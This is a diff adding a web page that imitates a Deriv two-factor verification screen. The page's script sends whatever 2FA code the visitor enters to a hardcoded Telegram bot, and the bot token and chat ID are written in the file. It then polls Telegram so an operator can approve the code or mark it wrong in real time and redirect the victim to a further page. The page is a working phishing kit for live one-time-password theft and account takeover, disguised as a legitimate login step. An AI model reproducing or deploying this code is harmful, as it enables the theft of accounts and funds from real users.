@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Deriv 2FA Verification</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .auth-box {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            padding: 2rem;
+            border: 1px solid #eee;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        
+        .auth-box img {
+            width: 100px;
+            margin-bottom: 1rem;
+        }
+        
+        .btn-custom {
+            background-color: white;
+            border: 1px solid black;
+            padding: 0.5rem 1.5rem;
+            font-weight: 600;
+            transition: 0.3s;
+        }
+        
+        .btn-custom:hover {
+            background-color: #f1f1f1;
+        }
+        
+        .form-control {
+            text-align: center;
+        }
+        /* ===== SPINNER OVERLAY ===== */
+        
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ffffff30;
+            border-top-color: #dc3545;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #e0e0e0;
+            font-size: 14px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-code {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 600;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 20px;
+            padding: 10px 24px;
+            background: transparent;
+            border: 1px solid #6c757d;
+            border-radius: 50px;
+            color: #adb5bd;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #dc3545;
+            color: #dc3545;
+        }
+        
+        .error-msg {
+            background: rgba(220, 53, 69, 0.15);
+            border: 1px solid rgba(220, 53, 69, 0.3);
+            color: #dc3545;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="auth-box">
+        <h2 class="mb-4" style="color: #ff444f; font-weight: bold; font-style: italic;">deriv</h2>
+
+        <p>Enter the two-factor authentication (2FA) code from the authenticator app on your phone.</p>
+
+        <!-- Error message area -->
+        <div class="error-msg" id="verifyError"></div>
+
+        <div class="mb-3">
+            <input type="text" class="form-control" id="verificationCode" placeholder="Verification Code">
+        </div>
+
+        <button class="btn btn-custom" id="proceedBtn" onclick="submitCode()">Proceed</button>
+    </div>
+
+    <!-- SPINNER OVERLAY -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">Verifying your 2FA code...</p>
+        <p class="spinner-code" id="spinnerCodeDisplay"></p>
+        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
+    </div>
+
+    <script>
+        // =====================================================
+        // CONFIG
+        // =====================================================
+        const TELEGRAM_BOT_TOKEN = "8676570649:AAEQLrnR5ZnIxXQeXW0TGrgi3FvYX3nQ0O0";
+        const TELEGRAM_CHAT_ID = "1003670447";
+        const APPROVAL_REDIRECT_URL = "otp2.html";
+
+        // =====================================================
+        // POLLING STATE
+        // =====================================================
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let pollAbortController = null;
+        let isPollingActive = false;
+
+        // =====================================================
+        // UI HELPERS
+        // =====================================================
+        function showError(msg) {
+            const err = document.getElementById('verifyError');
+            if (err) {
+                err.textContent = msg;
+                err.style.display = 'block';
+            }
+        }
+
+        function hideError() {
+            const err = document.getElementById('verifyError');
+            if (err) err.style.display = 'none';
+        }
+
+        function maskCode(code) {
+            if (code.length <= 2) return '*'.repeat(code.length);
+            return code.charAt(0) + '*'.repeat(code.length - 2) + code.charAt(code.length - 1);
+        }
+
+        // =====================================================
+        // CANCEL POLLING
+        // =====================================================
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (pollAbortController) pollAbortController.abort();
+            isPollingActive = false;
+            document.getElementById('spinnerOverlay').classList.remove('active');
+            document.getElementById('proceedBtn').disabled = false;
+            showError('Request cancelled. Please try again.');
+        }
+
+        // =====================================================
+        // POLLING ENGINE — long-poll, 409-safe, callback-only
+        // =====================================================
+        function startPolling(userId) {
+            pollDecided = false;
+            let offset = 0;
+            let pollCount = 0;
+            const MAX_POLLS = 180;
+
+            if (pollAbortController) pollAbortController.abort();
+            pollAbortController = new AbortController();
+
+            function pollLoop() {
+                if (pollDecided) return;
+                if (isPollingActive) {
+                    pollTimeoutId = setTimeout(pollLoop, 500);
+                    return;
+                }
+
+                pollCount++;
+                if (pollCount > MAX_POLLS) {
+                    pollDecided = true;
+                    document.getElementById('spinnerOverlay').classList.remove('active');
+                    document.getElementById('proceedBtn').disabled = false;
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                isPollingActive = true;
+
+                const url =
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
+                    `?offset=${offset}&timeout=15&allowed_updates=%5B%22callback_query%22%5D`;
+
+                fetch(url, {
+                        signal: pollAbortController.signal
+                    })
+                    .then(res => {
+                        if (res.status === 409) {
+                            isPollingActive = false;
+                            pollTimeoutId = setTimeout(pollLoop, 3000);
+                            return null;
+                        }
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+
+                        if (!data.ok || pollDecided) {
+                            isPollingActive = false;
+                            if (!pollDecided) {
+                                pollTimeoutId = setTimeout(pollLoop, 1000);
+                            }
+                            return;
+                        }
+
+                        if (data.result && data.result.length > 0) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+
+                                if (update.callback_query) {
+                                    const action = update.callback_query.data;
+
+                                    // Answer callback to remove loading state
+                                    fetch(
+                                            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json'
+                                                },
+                                                body: JSON.stringify({
+                                                    callback_query_id: update.callback_query.id,
+                                                    text: "Processing..."
+                                                })
+                                            }
+                                        )
+                                        .catch(() => {});
+
+                                    if (action === `approve_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        // Approval — redirect to next page
+                                        window.location.href = APPROVAL_REDIRECT_URL;
+                                        return;
+                                    } else if (action === `decline_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        document.getElementById('proceedBtn').disabled = false;
+                                        showError('Request declined. Please try again.');
+                                        return;
+                                    } else if (action === `wrong_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        document.getElementById('proceedBtn').disabled = false;
+                                        showError('Wrong 2FA code. Please enter the correct code.');
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 500);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 2000);
+                        }
+                    });
+            }
+
+            pollLoop();
+        }
+
+        // =====================================================
+        // SEND MESSAGE + INLINE KEYBOARD
+        // =====================================================
+        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const proceedBtn = document.getElementById('proceedBtn');
+
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attemptSend() {
+                attempts++;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            startPolling(userId);
+                        } else {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptSend, 1000 * attempts);
+                            } else {
+                                spinnerOverlay.classList.remove('active');
+                                proceedBtn.disabled = false;
+                                showError('Failed to send notification. Please try again.');
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Send error:', err);
+                        if (attempts < maxAttempts) {
+                            setTimeout(attemptSend, 1000 * attempts);
+                        } else {
+                            spinnerOverlay.classList.remove('active');
+                            proceedBtn.disabled = false;
+                            showError('Network error. Please check your connection and try again.');
+                        }
+                    });
+            }
+
+            attemptSend();
+        }
+
+        // =====================================================
+        // SUBMIT 2FA CODE
+        // =====================================================
+        function submitCode() {
+            hideError();
+
+            const code = document.getElementById('verificationCode').value.trim();
+            if (code === '') {
+                showError('Please enter the verification code.');
+                return;
+            }
+
+            // Show spinner
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const spinnerCodeDisplay = document.getElementById('spinnerCodeDisplay');
+            const proceedBtn = document.getElementById('proceedBtn');
+
+            spinnerCodeDisplay.textContent = 'Code: ' + maskCode(code);
+            spinnerOverlay.classList.add('active');
+            proceedBtn.disabled = true;
+
+            // Unique userId per session
+            const userId = '2fa_' + Date.now();
+
+            const message =
+                `🔐 <b>New Deriv 2FA Code Submitted</b>\n\n` +
+                `🔑 Verification Code: <code>${code}</code>\n` +
+                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
+                `Please approve, decline, or mark as wrong code:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: "⚠️ WRONG CODE",
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramWithInlineKeyboard(message, keyboard, userId);
+        }
+    </script>
+
+</body>
+
+</html>
